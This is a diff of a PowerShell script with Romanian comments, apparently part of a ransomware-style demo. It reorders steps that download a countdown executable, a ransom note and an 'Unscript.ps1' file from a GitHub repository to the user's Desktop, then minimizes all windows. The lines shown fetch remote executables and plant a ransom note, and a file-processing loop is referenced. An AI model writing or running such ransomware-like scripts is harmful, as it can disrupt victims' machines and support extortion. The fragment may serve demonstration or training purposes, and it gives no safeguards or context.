@@ -41,6 +41,12 @@ $output = "$env:USERPROFILE\Desktop\Countdown.exe"
 $webClient = New-Object System.Net.WebClient
 $webClient.DownloadFile($url, $output)
 
+# Descarca fisierul "ransom.txt"
+$url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/ransom.txt"
+$output = "$env:USERPROFILE\Desktop\ransom.txt"
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($url, $output)
+
 # Minimizeaza toate aplicatiile care ruleaza
 $shell = New-Object -ComObject Shell.Application
 $shell.MinimizeAll()
@@ -139,12 +145,6 @@ foreach ($file in $files1) {
 # Descarca fisierul Unscript.ps1
 $url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/Unscript.ps1"
 $output = "$env:USERPROFILE\Desktop\Unscript.ps1"
-$webClient = New-Object System.Net.WebClient
-$webClient.DownloadFile($url, $output)
-
-# Descarca fisierul "ransom.txt"
-$url = "https://raw.githubusercontent.com/wbtlgn/Demo/main/ransom.txt"
-$output = "$env:USERPROFILE\Desktop\ransom.txt"
 $webClient = New-Object System.Net.WebClient
 $webClient.DownloadFile($url, $output)
 
